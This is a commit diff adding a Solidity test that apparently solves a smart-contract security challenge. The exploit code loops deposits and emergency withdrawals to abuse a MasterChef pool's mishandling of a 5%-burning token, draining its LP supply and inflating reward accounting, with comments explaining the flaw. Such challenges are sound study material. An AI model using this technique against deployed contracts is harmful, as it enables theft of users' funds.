3ee1a11404afe24896087cf8ff9a9a96ebd344ae
gp <gp.bc.github@gmail.com>
2023-02-16 08:19:41 -0800

    solve 9

--- test/9-inflationary-net-worth.sol
+++ test/9-inflationary-net-worth.sol
@@ -78,7 +78,45 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        //Inside deposit() our balance (user.amount) is increased by _amount
+        //However the token is deflationnary burn 5% of amount  per swap:
+        //If we send 10_000e18 in reality masterChef will receive 9_500e18 but our balance is increased by 10_000e18
+        //So  we will be able to withdraw 10_000e18 to masterChef and we will receive 9_500e18
+        //During this operation the balance of masterChef will loose 500e18 
+        //If we make a loop we will be able to reduce the lpSupply till our user.amount > balance of masterChef
+        //Another thing, there is a logic error but not important for our case  at L202.We are added the previous pool.accMunyShare with the newest so we're artificially increase the muny per share 
 
+        mula.approve(address(masterChef),type(uint).max);
+        bool first = true;
+        uint count;
+        uint amount;
+        //Loop for decrease the lpSupply inside masterChef until we are not able to withdraw our amount deposited
+        while( mula.balanceOf(address(masterChef)) > amount || first){ //uint256(38e18)
+            if(first){
+                 first=false;     
+            }
+            else{
+                masterChef.emergencyWithdraw(0);
+                console.log("balance attacker - withdraw: ",mula.balanceOf(address(attacker)) );
+                console.log("balance masterChef - withdraw: ", mula.balanceOf(address(masterChef)) );
+            }
+            amount = mula.balanceOf(address(attacker));
+            console.log("amount : ",amount);
+            masterChef.deposit(0,mula.balanceOf(address(attacker)));
+            ++count;
+            console.log("count : ",count);
+            console.log("balance attacker - deposit: ",mula.balanceOf(address(attacker)) );
+            console.log("balance masterChef - deposit: ", mula.balanceOf(address(masterChef)) );
+            
+
+        }
+        //Here we are not able to withdraw the amount deposited because user.amount > lpSupply
+        console.log("balance attacker : ",mula.balanceOf(address(attacker)) );
+        console.log("balance masterChef : ", mula.balanceOf(address(masterChef)) );
+        //Withdraw all the lpSupply in order to manipulate pool.accMunyPerShare and be able to claim all the fees after that 
+        masterChef.withdraw(0,mula.balanceOf(address(masterChef))-1);
+        console.log("balance masterChef : ", mula.balanceOf(address(masterChef)), "balance user.amount : ", amount -(mula.balanceOf(address(masterChef))-1));
+    
         vm.stopPrank();
         validation();
     }
